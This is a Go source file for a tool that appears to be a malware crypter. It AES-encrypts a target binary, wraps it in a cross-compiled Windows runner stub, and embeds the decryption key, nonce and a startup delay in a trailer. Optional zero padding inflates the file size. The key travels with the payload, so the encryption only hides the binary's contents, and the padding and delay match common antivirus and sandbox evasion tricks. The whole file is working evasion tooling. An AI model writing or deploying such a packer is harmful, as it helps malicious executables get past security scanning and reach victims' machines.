package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// runnerSource is the Go source of the self-extracting runner stub.
// It lives in runner.src (not .go, so the compiler ignores it).
// At encryption time it is compiled into a Windows .exe.
//
//go:embed runner.src
var runnerSource []byte

const magic = "HBX1"

// metadata is the JSON trailer appended after the ciphertext.
type metadata struct {
	Key           string  `json:"key"`
	Nonce         string  `json:"nonce"`
	Delay         float64 `json:"delay"`
	OriginalName  string  `json:"original_name"`
	OriginalSize  int     `json:"original_size"`
	CiphertextLen int     `json:"ciphertext_len"`
}

// encryptAndBuild reads inputPath, encrypts it, compiles the runner
// stub, and assembles the final output file at outputPath.
//
// Output layout:
//
//	[runner.exe] [zero padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
func encryptAndBuild(inputPath, outputPath string, addSizeMB, delay float64) error {
	// 1. Read the target binary.
	plaintext, err := os.ReadFile(inputPath)
	if err != nil {
		return fmt.Errorf("cannot read %s: %w", inputPath, err)
	}

	// 2. Encrypt with AES-256-GCM.
	key := make([]byte, 32)
	nonce := make([]byte, 12)
	rand.Read(key)
	rand.Read(nonce)

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("aes: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("gcm: %w", err)
	}
	ciphertext := gcm.Seal(nil, nonce, plaintext, []byte(magic))

	// 3. Build the JSON trailer.
	meta := metadata{
		Key:           base64.StdEncoding.EncodeToString(key),
		Nonce:         base64.StdEncoding.EncodeToString(nonce),
		Delay:         delay,
		OriginalName:  filepath.Base(inputPath),
		OriginalSize:  len(plaintext),
		CiphertextLen: len(ciphertext),
	}
	metaJSON, _ := json.Marshal(meta)

	// 4. Cross-compile the runner stub for Windows.
	fmt.Println("[INFO] Compiling runner stub for windows/amd64 ...")
	stub, err := compileRunner()
	if err != nil {
		return fmt.Errorf("compile runner: %w", err)
	}

	// 5. Assemble the output file.
	paddingSize := int(addSizeMB * 1024 * 1024)

	metaLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(metaLenBuf, uint32(len(metaJSON)))

	out, err := os.OpenFile(outputPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o755)
	if err != nil {
		return err
	}
	defer out.Close()

	out.Write(stub)
	writePadding(out, paddingSize)
	out.Write(ciphertext)
	out.Write(metaJSON)
	out.Write(metaLenBuf)
	out.Write([]byte(magic))

	totalSize := len(stub) + paddingSize + len(ciphertext) + len(metaJSON) + 8

	fmt.Printf("[OK] Encryption is successful! Encrypted binary saved as %q.\n", outputPath)
	fmt.Printf("[INFO] Input:       %s\n", inputPath)
	fmt.Printf("[INFO] Runner:      %s\n", outputPath)
	fmt.Printf("[INFO] Added size:  %.0f MB\n", addSizeMB)
	fmt.Printf("[INFO] Delay:       %.0f second(s)\n", delay)
	fmt.Printf("[INFO] Runner size: %d bytes (%.1f MB)\n", totalSize, float64(totalSize)/(1024*1024))
	return nil
}

// compileRunner cross-compiles the embedded runner source into a
// Windows .exe in a temp directory and returns the resulting bytes.
func compileRunner() ([]byte, error) {
	tmpDir, err := os.MkdirTemp("", "hbx-build-")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), runnerSource, 0o644); err != nil {
		return nil, err
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte("module runner\n\ngo 1.21\n"), 0o644); err != nil {
		return nil, err
	}

	outPath := filepath.Join(tmpDir, "runner.exe")
	cmd := exec.Command("go", "build", "-o", outPath, "-ldflags", "-s -w", ".")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("go build failed:\n%s\n%w", string(out), err)
	}
	return os.ReadFile(outPath)
}

// writePadding writes n zero bytes in 32 KB chunks.
func writePadding(f *os.File, n int) {
	buf := make([]byte, 32*1024)
	for n > 0 {
		chunk := n
		if chunk > len(buf) {
			chunk = len(buf)
		}
		f.Write(buf[:chunk])
		n -= chunk
	}
}
